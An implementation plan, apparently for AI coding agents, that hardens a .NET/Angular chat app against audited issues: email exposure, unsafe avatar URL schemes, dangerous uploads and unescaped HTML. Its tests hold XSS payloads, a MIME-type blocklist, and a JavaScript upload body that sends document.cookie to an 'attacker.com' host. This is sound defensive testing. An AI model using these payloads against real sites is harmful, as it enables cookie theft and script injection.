# Security Hardening (SEC-01 → SEC-05) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix the four MEDIUM and one LOW security vulnerabilities identified in the T205 audit (SECURITY.md), with unit + E2E + UAT test coverage for each fix, following the Builder → Auditor → QA orchestration flow from `.workspace/prompts/INIT_PROMPTS.md`.

**Architecture:** Each finding is an independent, self-contained backend or frontend change. Backend fixes are in `src/ChatHerder.API/Endpoints/` (UserEndpoints, FilesEndpoints) and `frontend/src/app/shared/utils/inline-markdown.ts`. All backend fixes follow the existing TDD pattern: expose `*Internal` static method → unit test with in-memory EF → implement → E2E.

**Tech Stack:** .NET 10 Minimal APIs, xUnit + NSubstitute (unit tests), Angular 21 + DomSanitizer, Playwright TypeScript (E2E + UAT).

---

## Orchestration Protocol (from INIT_PROMPTS.md)

For **each task** in this plan:
1. **Builder** implements the fix (code + unit tests).
2. **Auditor** reviews the changed files for security and AGENT.md compliance.
3. **QA** runs the E2E/UAT tests for that fix.
4. **Log** updated in DEVELOPMENT_LOG.md only after both sub-agents approve.

---

## File Map

| File | Action | Reason |
|---|---|---|
| `src/ChatHerder.API/Endpoints/UserEndpoints.cs` | Modify | SEC-01: strip email from `GetByUsername`; SEC-05: validate `avatarUrl` scheme |
| `src/ChatHerder.API/Endpoints/FilesEndpoints.cs` | Modify | SEC-03: reject blocked MIME types + validate image magic bytes |
| `frontend/src/app/shared/utils/inline-markdown.ts` | Modify | SEC-04: add `escapeHtml()` to `markersToHtml` |
| `tests/ChatHerder.Unit.Tests/Endpoints/UserEndpointsTests.cs` | Modify | Unit tests for SEC-01 and SEC-05 |
| `tests/ChatHerder.Unit.Tests/Endpoints/FilesEndpointsTests.cs` | Modify | Unit tests for SEC-03 |
| `frontend/src/app/shared/utils/inline-markdown.spec.ts` | Modify | Unit tests for SEC-04 |
| `e2e/tests/12-security-hardening.spec.ts` | Create | E2E API-level tests for SEC-01, SEC-03, SEC-05 |
| `e2e/tests/uat/10-security-hardening.uat.spec.ts` | Create | UAT narrative tests for the security fixes |

---

## Task 1: SEC-01 — Remove Email from `GetByUsername` Response

**Files:**
- Modify: `src/ChatHerder.API/Endpoints/UserEndpoints.cs:64–73`
- Modify: `tests/ChatHerder.Unit.Tests/Endpoints/UserEndpointsTests.cs`

### Step 1.1: Expose `GetByUsername` as an internal testable method

Open `src/ChatHerder.API/Endpoints/UserEndpoints.cs`. Add this `internal` helper beneath the existing helpers at the bottom of the class:

```csharp
internal static Task<IResult> GetByUsernameInternal(string name, AppDbContext db, CancellationToken ct)
    => GetByUsername(name, db, ct);
```

Also add the helper to `UserEndpointsTestHelper` in `tests/ChatHerder.Unit.Tests/Endpoints/UserEndpointsTests.cs`:

```csharp
public static Task<IResult> GetByUsername(string name, AppDbContext db, CancellationToken ct)
    => ChatHerder.API.Endpoints.UserEndpoints.GetByUsernameInternal(name, db, ct);
```

- [ ] **Step 1.2: Write the failing unit test**

Add to `tests/ChatHerder.Unit.Tests/Endpoints/UserEndpointsTests.cs`, inside `UserEndpointsTests`:

```csharp
[Fact]
public async Task GetByUsername_ReturnsPublicDto_WithoutEmail()
{
    await using var db = BuildContext();
    var user = new User { Username = "alice", Email = "alice@secret.com", PasswordHash = "x" };
    db.Users.Add(user);
    await db.SaveChangesAsync();

    var result = await UserEndpointsTestHelper.GetByUsername("alice", db, CancellationToken.None);

    var ok = Assert.IsType<Ok<UserSearchResultDto>>(result);
    Assert.Equal("alice", ok.Value!.Username);
    // UserSearchResultDto has no Email property — if this compiles, the DTO type is correct.
    Assert.Equal(user.Id, ok.Value.Id);
}

[Fact]
public async Task GetByUsername_Returns404_WhenUserDoesNotExist()
{
    await using var db = BuildContext();

    var result = await UserEndpointsTestHelper.GetByUsername("nobody", db, CancellationToken.None);

    var statusCode = result.GetType().GetProperty("StatusCode")?.GetValue(result);
    Assert.Equal(404, statusCode);
}
```

- [ ] **Step 1.3: Run tests to confirm RED**

```bash
cd /Users/igorvaskonyan/projects/ai/ai-chat-herder
dotnet test tests/ChatHerder.Unit.Tests/ --filter "GetByUsername_ReturnsPublicDto_WithoutEmail|GetByUsername_Returns404" --no-build 2>&1 | tail -20
```

Expected: compilation error because `GetByUsername` returns `Ok<UserDto>` not `Ok<UserSearchResultDto>`, and `GetByUsernameInternal` doesn't exist yet.

- [ ] **Step 1.4: Implement the fix**

In `src/ChatHerder.API/Endpoints/UserEndpoints.cs`, change the `GetByUsername` method body:

```csharp
private static async Task<IResult> GetByUsername(
    string name,
    AppDbContext db,
    CancellationToken ct)
{
    var user = await db.Users
        .FirstOrDefaultAsync(u => u.Username == name && u.DeletedAt == null, ct);
    if (user is null) return Results.NotFound();
    return Results.Ok(new UserSearchResultDto(user.Id, user.Username, user.AvatarUrl));
}
```

And add the `internal` helper at the bottom of the `UserEndpoints` class (after `SearchUsersInternal`):

```csharp
internal static Task<IResult> GetByUsernameInternal(string name, AppDbContext db, CancellationToken ct)
    => GetByUsername(name, db, ct);
```

- [ ] **Step 1.5: Run tests to confirm GREEN**

```bash
dotnet test tests/ChatHerder.Unit.Tests/ --filter "GetByUsername" --no-build 2>&1 | tail -10
```

Expected: all `GetByUsername` tests PASS.

- [ ] **Step 1.6: Run full unit test suite**

```bash
dotnet test tests/ChatHerder.Unit.Tests/ 2>&1 | tail -15
```

Expected: all existing tests still pass (count should be ≥121).

- [ ] **Step 1.7: Commit**

```bash
git add src/ChatHerder.API/Endpoints/UserEndpoints.cs \
        tests/ChatHerder.Unit.Tests/Endpoints/UserEndpointsTests.cs
git commit -m "fix(sec-01): remove email from GetByUsername response — use UserSearchResultDto"
```

---

## Task 2: SEC-05 — Validate Avatar URL Scheme

**Files:**
- Modify: `src/ChatHerder.API/Endpoints/UserEndpoints.cs:53–57`
- Modify: `tests/ChatHerder.Unit.Tests/Endpoints/UserEndpointsTests.cs`

- [ ] **Step 2.1: Write the failing unit tests**

Add to `UserEndpointsTests`:

```csharp
[Fact]
public async Task PatchMe_Returns400_WhenAvatarUrlIsJavascriptScheme()
{
    await using var db = BuildContext();
    var user = new User { Username = "alice", Email = "alice@test.com", PasswordHash = "x" };
    db.Users.Add(user);
    await db.SaveChangesAsync();

    var req = new UpdateMeRequest("javascript:alert(document.cookie)");
    var result = await UserEndpointsTestHelper.PatchMe(req, MakePrincipal(user.Id), db, CancellationToken.None);

    var statusCode = result.GetType().GetProperty("StatusCode")?.GetValue(result);
    Assert.Equal(400, statusCode);
}

[Fact]
public async Task PatchMe_Returns400_WhenAvatarUrlIsDataScheme()
{
    await using var db = BuildContext();
    var user = new User { Username = "alice", Email = "alice@test.com", PasswordHash = "x" };
    db.Users.Add(user);
    await db.SaveChangesAsync();

    var req = new UpdateMeRequest("data:text/html,<script>alert(1)</script>");
    var result = await UserEndpointsTestHelper.PatchMe(req, MakePrincipal(user.Id), db, CancellationToken.None);

    var statusCode = result.GetType().GetProperty("StatusCode")?.GetValue(result);
    Assert.Equal(400, statusCode);
}

[Fact]
public async Task PatchMe_Returns400_WhenAvatarUrlIsHttpScheme()
{
    await using var db = BuildContext();
    var user = new User { Username = "alice", Email = "alice@test.com", PasswordHash = "x" };
    db.Users.Add(user);
    await db.SaveChangesAsync();

    var req = new UpdateMeRequest("http://example.com/avatar.png");
    var result = await UserEndpointsTestHelper.PatchMe(req, MakePrincipal(user.Id), db, CancellationToken.None);

    var statusCode = result.GetType().GetProperty("StatusCode")?.GetValue(result);
    Assert.Equal(400, statusCode);
}

[Fact]
public async Task PatchMe_ReturnsOk_WhenAvatarUrlIsHttpsScheme()
{
    await using var db = BuildContext();
    var user = new User { Username = "alice", Email = "alice@test.com", PasswordHash = "x" };
    db.Users.Add(user);
    await db.SaveChangesAsync();

    var req = new UpdateMeRequest("https://cdn.example.com/avatar.png");
    var result = await UserEndpointsTestHelper.PatchMe(req, MakePrincipal(user.Id), db, CancellationToken.None);

    Assert.IsType<Ok<UserDto>>(result);
}

[Fact]
public async Task PatchMe_ReturnsOk_WhenAvatarUrlIsNull()
{
    await using var db = BuildContext();
    var user = new User { Username = "alice", Email = "alice@test.com", PasswordHash = "x" };
    db.Users.Add(user);
    await db.SaveChangesAsync();

    var req = new UpdateMeRequest(null);
    var result = await UserEndpointsTestHelper.PatchMe(req, MakePrincipal(user.Id), db, CancellationToken.None);

    Assert.IsType<Ok<UserDto>>(result);
}
```

- [ ] **Step 2.2: Run tests to confirm RED**

```bash
dotnet test tests/ChatHerder.Unit.Tests/ \
  --filter "PatchMe_Returns400_WhenAvatarUrlIsJavascriptScheme|PatchMe_Returns400_WhenAvatarUrlIsDataScheme|PatchMe_Returns400_WhenAvatarUrlIsHttpScheme|PatchMe_ReturnsOk_WhenAvatarUrlIsHttpsScheme" \
  --no-build 2>&1 | tail -15
```

Expected: `javascript:` and `data:` tests FAIL (currently returns 200), `http:` test FAIL.

- [ ] **Step 2.3: Implement the fix**

Replace the `PatchMe` method body in `UserEndpoints.cs`:

```csharp
private static async Task<IResult> PatchMe(
    UpdateMeRequest req,
    ClaimsPrincipal principal,
    AppDbContext db,
    CancellationToken ct)
{
    if (!Guid.TryParse(principal.FindFirstValue("user_id"), out var userId))
        return Results.Unauthorized();
    var user = await db.Users.FirstOrDefaultAsync(u => u.Id == userId && u.DeletedAt == null, ct);
    if (user is null) return Results.NotFound();

    if (req.AvatarUrl is not null)
    {
        if (req.AvatarUrl.Length > 2048)
            return Results.BadRequest(new { error = "Avatar URL must be ≤ 2048 characters." });

        if (!Uri.TryCreate(req.AvatarUrl, UriKind.Absolute, out var uri) ||
            !string.Equals(uri.Scheme, "https", StringComparison.OrdinalIgnoreCase))
            return Results.BadRequest(new { error = "Avatar URL must use the HTTPS scheme." });

        user.AvatarUrl = req.AvatarUrl;
    }

    await db.SaveChangesAsync(ct);
    return Results.Ok(new UserDto(user.Id, user.Username, user.Email, user.AvatarUrl));
}
```

- [ ] **Step 2.4: Run tests to confirm GREEN**

```bash
dotnet test tests/ChatHerder.Unit.Tests/ --filter "PatchMe" --no-build 2>&1 | tail -10
```

Expected: all `PatchMe` tests PASS.

- [ ] **Step 2.5: Run full suite**

```bash
dotnet test tests/ChatHerder.Unit.Tests/ 2>&1 | tail -5
```

- [ ] **Step 2.6: Commit**

```bash
git add src/ChatHerder.API/Endpoints/UserEndpoints.cs \
        tests/ChatHerder.Unit.Tests/Endpoints/UserEndpointsTests.cs
git commit -m "fix(sec-05): validate avatarUrl must use HTTPS scheme"
```

---

## Task 3: SEC-03 — Server-Side MIME Type Validation on File Uploads

**Files:**
- Modify: `src/ChatHerder.API/Endpoints/FilesEndpoints.cs`
- Modify: `tests/ChatHerder.Unit.Tests/Endpoints/FilesEndpointsTests.cs`

**Design decision:** Two-layer defence:
1. A `BlockedMimeTypes` set immediately rejects known dangerous types (`text/html`, `application/javascript`, `image/svg+xml`, etc.).
2. For files claiming to be images (`image/*`), the first 16 bytes of the file body are checked against known image magic bytes. If the bytes don't match any known image format, the upload is rejected.

- [ ] **Step 3.1: Write the failing unit tests**

Add to `FilesEndpointsTests`:

```csharp
[Theory]
[InlineData("text/html")]
[InlineData("application/javascript")]
[InlineData("text/javascript")]
[InlineData("application/x-php")]
[InlineData("image/svg+xml")]
[InlineData("application/x-httpd-php")]
public async Task UploadFile_Returns400_WhenMimeTypeIsBlocked(string contentType)
{
    await using var db = BuildContext();
    var storage = Substitute.For<IFileStorage>();
    var file = MockFile(contentType, 1024L, "malicious.file");

    var result = await FilesEndpointsHelper.UploadFile(file, null, Principal(Guid.NewGuid()), db, storage, CancellationToken.None);

    var statusCode = result.GetType().GetProperty("StatusCode")?.GetValue(result);
    Assert.Equal(400, statusCode);
}

[Fact]
public async Task UploadFile_Returns400_WhenContentTypeClaimsImageButMagicBytesDoNotMatch()
{
    await using var db = BuildContext();
    var storage = Substitute.For<IFileStorage>();

    // File claims image/jpeg but first bytes are HTML — mismatch
    var maliciousContent = "<html><script>alert(1)</script></html>"u8.ToArray();
    var file = Substitute.For<IFormFile>();
    file.ContentType.Returns("image/jpeg");
    file.FileName.Returns("evil.jpg");
    file.Length.Returns((long)maliciousContent.Length);
    file.OpenReadStream().Returns(new MemoryStream(maliciousContent));

    var result = await FilesEndpointsHelper.UploadFile(file, null, Principal(Guid.NewGuid()), db, storage, CancellationToken.None);

    var statusCode = result.GetType().GetProperty("StatusCode")?.GetValue(result);
    Assert.Equal(400, statusCode);
}

[Fact]
public async Task UploadFile_Returns201_WhenImageHasValidJpegMagicBytes()
{
    await using var db = BuildContext();
    var storage = Substitute.For<IFileStorage>();
    storage.SaveAsync(Arg.Any<Stream>(), Arg.Any<string>(), Arg.Any<CancellationToken>())
           .Returns("abc/photo.jpg");

    // JPEG magic: FF D8 FF E0 ... followed by zeros to reach 16 bytes
    var jpegMagic = new byte[] { 0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01 };
    var file = Substitute.For<IFormFile>();
    file.ContentType.Returns("image/jpeg");
    file.FileName.Returns("photo.jpg");
    file.Length.Returns((long)jpegMagic.Length);
    file.OpenReadStream().Returns(new MemoryStream(jpegMagic));

    var result = await FilesEndpointsHelper.UploadFile(file, null, Principal(Guid.NewGuid()), db, storage, CancellationToken.None);

    var statusCode = result.GetType().GetProperty("StatusCode")?.GetValue(result);
    Assert.Equal(201, statusCode);
}

[Fact]
public async Task UploadFile_Returns201_WhenImageHasValidPngMagicBytes()
{
    await using var db = BuildContext();
    var storage = Substitute.For<IFileStorage>();
    storage.SaveAsync(Arg.Any<Stream>(), Arg.Any<string>(), Arg.Any<CancellationToken>())
           .Returns("abc/image.png");

    // PNG magic: 89 50 4E 47 0D 0A 1A 0A followed by padding
    var pngMagic = new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52 };
    var file = Substitute.For<IFormFile>();
    file.ContentType.Returns("image/png");
    file.FileName.Returns("image.png");
    file.Length.Returns((long)pngMagic.Length);
    file.OpenReadStream().Returns(new MemoryStream(pngMagic));

    var result = await FilesEndpointsHelper.UploadFile(file, null, Principal(Guid.NewGuid()), db, storage, CancellationToken.None);

    var statusCode = result.GetType().GetProperty("StatusCode")?.GetValue(result);
    Assert.Equal(201, statusCode);
}
```

- [ ] **Step 3.2: Run tests to confirm RED**

```bash
dotnet test tests/ChatHerder.Unit.Tests/ \
  --filter "UploadFile_Returns400_WhenMimeTypeIsBlocked|UploadFile_Returns400_WhenContentTypeClaimsImageBut|UploadFile_Returns201_WhenImageHasValid" \
  --no-build 2>&1 | tail -20
```

Expected: blocked-MIME and magic-byte mismatch tests FAIL (currently returns 201).

- [ ] **Step 3.3: Implement the fix**

Replace `FilesEndpoints.cs` with the following (full class, since changes are spread through it):

```csharp
using System.Security.Claims;
using ChatHerder.Application.DTOs;
using ChatHerder.Application.Ports;
using ChatHerder.Domain.Entities;
using ChatHerder.Infrastructure.Persistence;
using Microsoft.AspNetCore.Http;
using Microsoft.EntityFrameworkCore;

namespace ChatHerder.API.Endpoints;

public static class FilesEndpoints
{
    private const long MaxImageBytes = 3L  * 1024 * 1024;  // 3 MB
    private const long MaxFileBytes  = 20L * 1024 * 1024;  // 20 MB

    // MIME types that must never be accepted regardless of context.
    private static readonly HashSet<string> BlockedMimeTypes = new(StringComparer.OrdinalIgnoreCase)
    {
        "text/html",
        "text/javascript",
        "application/javascript",
        "application/x-javascript",
        "application/x-php",
        "text/x-php",
        "application/x-httpd-php",
        "image/svg+xml",              // SVG can embed scripts; block until sanitizer is in place
        "application/xml",
        "text/xml",
    };

    // Known image format magic-byte signatures (first bytes of the file body).
    private static readonly (byte[] Magic, int? Offset)[] ImageSignatures =
    [
        // JPEG: FF D8 FF
        ([0xFF, 0xD8, 0xFF], null),
        // PNG: 89 50 4E 47 0D 0A 1A 0A
        ([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A], null),
        // GIF87a / GIF89a: "GIF8"
        ([0x47, 0x49, 0x46, 0x38], null),
        // BMP: BM
        ([0x42, 0x4D], null),
        // ICO: 00 00 01 00
        ([0x00, 0x00, 0x01, 0x00], null),
        // WebP: "RIFF" at offset 0, "WEBP" at offset 8
        ([0x52, 0x49, 0x46, 0x46], null),
    ];

    public static RouteGroupBuilder MapFilesEndpoints(this RouteGroupBuilder group)
    {
        group.MapPost("/upload", UploadFile).RequireAuthorization().DisableAntiforgery();
        group.MapGet("/{id:guid}", GetFile).RequireAuthorization();
        return group;
    }

    internal static Task<IResult> UploadFileInternal(
        IFormFile? file, string? comment, ClaimsPrincipal p,
        AppDbContext db, IFileStorage storage, CancellationToken ct)
        => UploadFile(file, comment, p, db, storage, ct);

    internal static Task<IResult> GetFileInternal(
        Guid id, ClaimsPrincipal p, AppDbContext db, IFileStorage storage, CancellationToken ct)
        => GetFile(id, p, db, storage, ct);

    private static async Task<IResult> UploadFile(
        IFormFile? file,
        [Microsoft.AspNetCore.Mvc.FromForm] string? comment,
        ClaimsPrincipal principal,
        AppDbContext db,
        IFileStorage storage,
        CancellationToken ct)
    {
        if (!Guid.TryParse(principal.FindFirstValue("user_id"), out var userId))
            return Results.Unauthorized();

        if (file is null)
            return Results.BadRequest(new { error = "No file provided." });

        // Reject known-dangerous MIME types immediately.
        if (BlockedMimeTypes.Contains(file.ContentType))
            return Results.BadRequest(new { error = $"File type '{file.ContentType}' is not permitted." });

        var isImage = file.ContentType.StartsWith("image/", StringComparison.OrdinalIgnoreCase);
        var limit   = isImage ? MaxImageBytes : MaxFileBytes;
        if (file.Length > limit)
            return Results.StatusCode(StatusCodes.Status413RequestEntityTooLarge);

        // For image/* claims, validate magic bytes against known image signatures.
        if (isImage)
        {
            await using var readStream = file.OpenReadStream();
            var header = new byte[16];
            var read   = await readStream.ReadAsync(header.AsMemory(0, header.Length), ct);
            if (!IsKnownImageSignature(header.AsSpan(0, read)))
                return Results.BadRequest(new { error = "File content does not match the declared image type." });
        }

        await using var stream = file.OpenReadStream();
        var relPath = await storage.SaveAsync(stream, file.FileName, ct);

        var attachment = new Attachment
        {
            UploadedByUserId = userId,
            StoragePath      = relPath,
            FileName         = file.FileName,
            ContentType      = file.ContentType,
            SizeBytes        = file.Length,
            Comment          = string.IsNullOrWhiteSpace(comment) ? null : comment,
        };
        db.Attachments.Add(attachment);
        await db.SaveChangesAsync(ct);

        return Results.Created(
            $"/api/files/{attachment.Id}",
            new AttachmentDto(attachment.Id, attachment.FileName, attachment.ContentType,
                              attachment.SizeBytes, attachment.Comment));
    }

    internal static bool IsKnownImageSignature(ReadOnlySpan<byte> header)
    {
        foreach (var (magic, _) in ImageSignatures)
        {
            if (header.Length >= magic.Length && header.StartsWith(magic))
                return true;
        }
        return false;
    }

    private static async Task<IResult> GetFile(
        Guid id,
        ClaimsPrincipal principal,
        AppDbContext db,
        IFileStorage storage,
        CancellationToken ct)
    {
        if (!Guid.TryParse(principal.FindFirstValue("user_id"), out var callerId))
            return Results.Unauthorized();

        var attachment = await db.Attachments.FindAsync([id], ct);
        if (attachment is null) return Results.NotFound();

        if (attachment.MessageId.HasValue)
        {
            var msg = await db.Messages
                .FirstOrDefaultAsync(m => m.Id == attachment.MessageId, ct);
            if (msg is null) return Results.NotFound();

            var isMember = await db.RoomMemberships
                .AnyAsync(m => m.RoomId == msg.RoomId && m.UserId == callerId, ct);
            if (!isMember)
                return Results.StatusCode(StatusCodes.Status403Forbidden);

            var isBanned = await db.RoomBans
                .AnyAsync(b => b.RoomId == msg.RoomId && b.BannedUserId == callerId && b.RevokedAt == null, ct);
            if (isBanned)
                return Results.StatusCode(StatusCodes.Status403Forbidden);
        }
        else if (attachment.PersonalDialogMessageId.HasValue)
        {
            var pdm = await db.PersonalDialogMessages
                .Include(m => m.Dialog)
                .FirstOrDefaultAsync(m => m.Id == attachment.PersonalDialogMessageId, ct);
            if (pdm is null) return Results.NotFound();

            if (pdm.Dialog.User1Id != callerId && pdm.Dialog.User2Id != callerId)
                return Results.StatusCode(StatusCodes.Status403Forbidden);
        }
        else
        {
            // Unlinked orphan — only the uploader may preview
            if (attachment.UploadedByUserId != callerId)
                return Results.StatusCode(StatusCodes.Status403Forbidden);
        }

        var stream = await storage.OpenReadAsync(attachment.StoragePath, ct);
        return Results.Stream(stream, attachment.ContentType, attachment.FileName);
    }
}
```

> **Important:** The `IsKnownImageSignature` method is `internal` so the unit test can call it directly. The stream is read once for the magic-byte check, then `file.OpenReadStream()` is called again for the actual save — this works because `IFormFile.OpenReadStream()` returns a seekable stream in ASP.NET Core; NSubstitute mocks return a fresh `MemoryStream` per call.

- [ ] **Step 3.4: Run tests to confirm GREEN**

```bash
dotnet test tests/ChatHerder.Unit.Tests/ \
  --filter "UploadFile_Returns400_WhenMimeTypeIsBlocked|UploadFile_Returns400_WhenContentTypeClaimsImageBut|UploadFile_Returns201_WhenImageHasValid" \
  --no-build 2>&1 | tail -20
```

Expected: all new upload tests PASS.

- [ ] **Step 3.5: Run full suite**

```bash
dotnet test tests/ChatHerder.Unit.Tests/ 2>&1 | tail -5
```

Expected: all prior tests still pass.

- [ ] **Step 3.6: Commit**

```bash
git add src/ChatHerder.API/Endpoints/FilesEndpoints.cs \
        tests/ChatHerder.Unit.Tests/Endpoints/FilesEndpointsTests.cs
git commit -m "fix(sec-03): block dangerous MIME types and validate image magic bytes on upload"
```

---

## Task 4: SEC-04 — Make `markersToHtml` Safe by Adding HTML Escaping

**Files:**
- Modify: `frontend/src/app/shared/utils/inline-markdown.ts`
- Modify: `frontend/src/app/shared/utils/inline-markdown.spec.ts`

- [ ] **Step 4.1: Write the failing unit tests**

Add to `inline-markdown.spec.ts` inside the existing `describe('markersToHtml', ...)` block:

```typescript
it('escapes raw HTML before applying markdown to prevent XSS', () => {
  expect(markersToHtml('<script>alert(1)</script>')).toBe(
    '&lt;script&gt;alert(1)&lt;/script&gt;'
  );
});

it('escapes HTML in markdown payload — **<img onerror=x>** does not inject an img tag', () => {
  expect(markersToHtml('**<img onerror=alert(1)>**')).toBe(
    '<strong>&lt;img onerror=alert(1)&gt;</strong>'
  );
});

it('escapes ampersands and quotes', () => {
  expect(markersToHtml('a & b "quoted"')).toBe('a &amp; b &quot;quoted&quot;');
});
```

- [ ] **Step 4.2: Run tests to confirm RED**

```bash
cd /Users/igorvaskonyan/projects/ai/ai-chat-herder/frontend
npx ng test --include="src/app/shared/utils/inline-markdown.spec.ts" --watch=false 2>&1 | grep -E "FAILED|PASSED|escapes raw HTML|escapes HTML in markdown|escapes ampersands" | head -20
```

Expected: the three new tests FAIL (markersToHtml currently passes raw HTML through).

- [ ] **Step 4.3: Implement the fix**

In `frontend/src/app/shared/utils/inline-markdown.ts`, add `escapeHtml(text)` as the first operation in `markersToHtml`:

```typescript
export function markersToHtml(text: string): string {
  return escapeHtml(text)
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
    .replace(/_(.+?)_/g, '<em>$1</em>')
    .replace(/`(.+?)`/g, '<code>$1</code>')
    .replace(/\n/g, '<br>');
}
```

(`escapeHtml` is already defined at the top of the file and exported only internally.)

- [ ] **Step 4.4: Run tests to confirm GREEN**

```bash
npx ng test --include="src/app/shared/utils/inline-markdown.spec.ts" --watch=false 2>&1 | grep -E "FAILED|PASSED|✓|✗" | head -30
```

Expected: all inline-markdown tests PASS including the three new ones.

- [ ] **Step 4.5: Commit**

```bash
cd /Users/igorvaskonyan/projects/ai/ai-chat-herder
git add frontend/src/app/shared/utils/inline-markdown.ts \
        frontend/src/app/shared/utils/inline-markdown.spec.ts
git commit -m "fix(sec-04): add HTML escaping to markersToHtml to prevent latent XSS"
```

---

## Task 5: E2E Tests — `12-security-hardening.spec.ts`

**Files:**
- Create: `e2e/tests/12-security-hardening.spec.ts`

These are API-level Playwright tests that run against the live server. They verify the runtime behaviour of SEC-01, SEC-03, and SEC-05 fixes.

- [ ] **Step 5.1: Create the test file**

Create `e2e/tests/12-security-hardening.spec.ts`:

```typescript
import { test, expect } from '../fixtures/test-fixtures';

test.describe('Security hardening', () => {

  // SEC-01 — Email must not appear in by-username response
  test.describe('SEC-01: GetByUsername does not expose email', () => {
    test('authenticated user cannot retrieve another user email via by-username lookup', async ({ api, userA, userB }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.get(`/api/users/by-username/${userB.username}`);
      expect(res.status(), await res.text()).toBe(200);

      const body = await res.json();
      expect(body).not.toHaveProperty('email');
      expect(body.username).toBe(userB.username);
      expect(body.id).toBe(userB.id);

      await ctx.dispose();
    });

    test('own email is still returned by /api/users/me', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.get('/api/users/me');
      expect(res.status(), await res.text()).toBe(200);

      const body = await res.json();
      expect(body.email).toBe(userA.email);

      await ctx.dispose();
    });
  });

  // SEC-03 — Blocked MIME types are rejected at upload
  test.describe('SEC-03: Dangerous MIME types are rejected on upload', () => {
    test('upload with text/html content type returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: {
            name: 'page.html',
            mimeType: 'text/html',
            buffer: Buffer.from('<html><script>alert(1)</script></html>'),
          },
        },
      });
      expect(res.status()).toBe(400);
      const body = await res.json();
      expect(body.error).toContain('not permitted');

      await ctx.dispose();
    });

    test('upload with application/javascript content type returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: {
            name: 'evil.js',
            mimeType: 'application/javascript',
            buffer: Buffer.from('fetch("https://attacker.com?c="+document.cookie)'),
          },
        },
      });
      expect(res.status()).toBe(400);

      await ctx.dispose();
    });

    test('upload claiming image/jpeg but containing HTML returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: {
            name: 'malicious.jpg',
            mimeType: 'image/jpeg',
            // First bytes are "<html" — not JPEG magic FF D8 FF
            buffer: Buffer.from('<html><script>alert(1)</script></html>'),
          },
        },
      });
      expect(res.status()).toBe(400);
      const body = await res.json();
      expect(body.error).toContain('content does not match');

      await ctx.dispose();
    });

    test('upload of valid PNG file succeeds', async ({ api, userA }) => {
      // PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A + minimal IHDR chunk header
      const pngMagic = Buffer.from([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
        // width=1 height=1 8bit RGB non-interlaced
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
        0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
        0xDE, 0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41,
        0x54, 0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00,
        0x00, 0x00, 0x02, 0x00, 0x01, 0xE2, 0x21, 0xBC,
        0x33, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E,
        0x44, 0xAE, 0x42, 0x60, 0x82,
      ]);

      const ctx = await api.authContext(userA.accessToken);
      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: { name: 'pixel.png', mimeType: 'image/png', buffer: pngMagic },
        },
      });
      expect(res.status(), await res.text()).toBe(201);
      await ctx.dispose();
    });

    test('upload of text/plain document succeeds', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);
      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: {
            name: 'notes.txt',
            mimeType: 'text/plain',
            buffer: Buffer.from('Hello world'),
          },
        },
      });
      expect(res.status(), await res.text()).toBe(201);
      await ctx.dispose();
    });
  });

  // SEC-05 — Avatar URL scheme validation
  test.describe('SEC-05: Avatar URL must use HTTPS scheme', () => {
    test('PATCH /api/users/me with javascript: avatarUrl returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.patch('/api/users/me', {
        data: { avatarUrl: 'javascript:alert(document.cookie)' },
      });
      expect(res.status()).toBe(400);

      await ctx.dispose();
    });

    test('PATCH /api/users/me with data: avatarUrl returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.patch('/api/users/me', {
        data: { avatarUrl: 'data:text/html,<script>alert(1)</script>' },
      });
      expect(res.status()).toBe(400);

      await ctx.dispose();
    });

    test('PATCH /api/users/me with http: avatarUrl returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.patch('/api/users/me', {
        data: { avatarUrl: 'http://insecure.example.com/avatar.png' },
      });
      expect(res.status()).toBe(400);

      await ctx.dispose();
    });

    test('PATCH /api/users/me with https: avatarUrl succeeds', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.patch('/api/users/me', {
        data: { avatarUrl: 'https://cdn.example.com/avatar.png' },
      });
      expect(res.status(), await res.text()).toBe(200);

      const body = await res.json();
      expect(body.avatarUrl).toBe('https://cdn.example.com/avatar.png');

      await ctx.dispose();
    });
  });
});
```

- [ ] **Step 5.2: Run E2E tests (requires the app to be running)**

```bash
cd /Users/igorvaskonyan/projects/ai/ai-chat-herder
npx playwright test e2e/tests/12-security-hardening.spec.ts --reporter=list 2>&1 | tail -30
```

Expected: all 10 tests PASS.

- [ ] **Step 5.3: Commit**

```bash
git add e2e/tests/12-security-hardening.spec.ts
